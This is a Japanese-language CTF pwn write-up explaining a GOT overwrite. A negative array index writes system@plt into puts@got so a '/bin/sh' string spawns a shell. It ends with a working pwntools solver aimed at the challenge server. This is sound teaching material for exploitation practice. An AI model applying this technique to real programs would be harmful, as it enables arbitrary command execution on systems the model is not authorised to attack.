# Please Link Me

## / Overview

GOT Overwrite

## / Writeup

pwnのチャレンジです。配布ファイルの`chal`のセキュリティ機構を調べます。

```sh
$ checksec chal
[*] '/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`No PIE`と`Partial RELRO`と`No canary found`が意図的に設定されている様に見えます。

更に`chal.c`を見ると、インデックスを指定してデータを書き込める配列`values`がグローバルに定義されています。

極めつけにインデックスが正の値しか検証していません。

これは GOT Overwrite の問題で間違いないと思います。GOTとは共有ライブラリにある関数の実アドレスを記録しておく領域のことで`Full RELRO`の時、この領域は読み取り専用に設定されます。しかし今回は`Partial RELRO`なので書き込みも可能です。

書き込みができると何が嬉しいのかと言うと、**呼び出される関数を別の関数にすり替える**ことが出来ます。

例えば`printf`がプログラムで初めて呼び出される時、プログラムはまず、PLTという領域にある`printf@plt`を参照します。PLTの役割は外部ライブラリの`printf`のアドレスを特定し、`printf@got`に記録します。こうすることで次回以降はGOTに書かれているアドレスを一度だけ参照することで`printf`を呼び出すことができます。

しかしこれを悪用し、今後呼び出される関数のGOTを書き換えることで、PLTは間違った関数を正規の関数として実行してしまいます。これが GOT Overwrite です。

> [!NOTE]
> PLT領域自体は常に読み取り専用なので書き換えることはできない。


今回のチャレンジで配列の書き込みの後に呼び出される関数は`puts`で第１引数(rdi)には文字列`"/bin/sh; is this what you need?"`がセットされているため、もし`puts@got`に`system@plt`を書き込んだらどうなるでしょうか。

プログラムは`puts`が呼び出される時、`puts@plt`を参照します。`puts@plt`は`puts@got`を見ますが、そこには既に`system@plt`のアドレスが書き込まれています。`system@plt`はさらに`system@got`を参照することで、`puts`の代わりに`system`が呼び出されることになります。

`system`は第１引数をコマンドとして実行するためシェルが立ち上がります。これでファイルシステム内のフラグを開くことができます。

肝心の`puts@got`はどの様に書き換えるのかと言うと、ここで`values`がグローバルで定義された配列であることが重要になります。本来関数内で定義された配列はスタック領域に保管されますが、グローバル変数は`.bss`という領域に保管されます。これはGOT領域よりも高いアドレス位置に存在しており、`values`から`puts@got`を指定するには負のインデックスを参照すればいいということが分かります。

`No PIE`なので手元の`chal`から必要な部品のアドレスを調べて`puts@got`に`system@plt`を書き込みましょう。

## / Solver

```py
from pwn import *

elf = ELF('./chal')

puts_got = elf.got['puts']
system_plt = elf.plt['system']
values_addr = elf.symbols['values']
print(f'puts_got: {hex(puts_got)}')
print(f'system_plt: {hex(system_plt)}')
print(f'values_addr: {hex(values_addr)}')

index = str((puts_got - values_addr) // 8)

p = remote('34.170.146.252',25168)

p.sendlineafter(b'pos > ', index.encode())
p.sendlineafter(b'val > ', str(system_plt).encode())
p.interactive()
```